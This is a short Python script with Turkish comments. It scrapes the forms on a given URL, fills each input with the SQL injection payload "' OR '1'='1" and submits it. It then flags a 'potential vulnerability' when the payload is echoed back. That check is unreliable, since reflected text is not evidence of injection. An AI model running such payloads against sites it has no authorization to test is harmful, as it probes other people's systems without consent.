import requests
from bs4 import BeautifulSoup


def fetch_page(url):
    """
    Belirtilen URL'den HTML içeriğini alır.
    """
    try:
        response = requests.get(url, timeout=5)
        response.raise_for_status()  # HTTP hatalarını kontrol et
        return response.text
    except requests.RequestException as e:
        print(f"Hata: {e}")
        return None


def parse_forms(html):
    """
    HTML içeriğindeki formları bulur ve BeautifulSoup nesnesi olarak döner.
    """
    soup = BeautifulSoup(html, "html.parser")
    return soup.find_all("form")


def test_sql_injection(form, base_url):
    """
    Bir form üzerinde SQL Injection testi yapar.
    """
    # Form action ve method bilgilerini al
    action = form.get("action")
    method = form.get("method", "get").lower()
    # Zararlı payload (basit örnek)
    injection_payload = "' OR '1'='1"

    # Formdaki input alanlarını tespit edip, hepsine payload ekliyoruz
    inputs = form.find_all("input")
    data = {}
    for input_field in inputs:
        name = input_field.get("name")
        if name:
            data[name] = injection_payload

    # Eğer action boşsa, form aynı sayfaya gönderilir; değilse, base_url ile birleştir.
    if action:
        if action.startswith("http"):
            target_url = action
        else:
            target_url = base_url.rstrip("/") + "/" + action.lstrip("/")
    else:
        target_url = base_url

    try:
        print(f"\nTest ediliyor: {target_url} (Method: {method.upper()})")
        if method == "post":
            response = requests.post(target_url, data=data, timeout=5)
        else:
            response = requests.get(target_url, params=data, timeout=5)

        # Basit bir kontrol: Yanıt içinde payload'un izlerini arıyoruz
        if injection_payload in response.text:
            print(f"[!] Potansiyel SQL Injection açığı tespit edildi!")
        else:
            print(f"[✔] Görünürde bir açık tespit edilmedi.")
    except Exception as e:
        print(f"Hata: {e}")


def perform_sql_injection_test(url):
    """
    Belirtilen URL üzerinde SQL Injection testlerini gerçekleştirir.
    """
    html = fetch_page(url)
    if not html:
        print("HTML içeriği alınamadı.")
        return

    forms = parse_forms(html)
    print(f"\n{len(forms)} form bulundu.")

    for form in forms:
        test_sql_injection(form, url)


if __name__ == "__main__":
    target_url = input("Hedef URL (http:// veya https:// ile girin): ")
    perform_sql_injection_test(target_url)
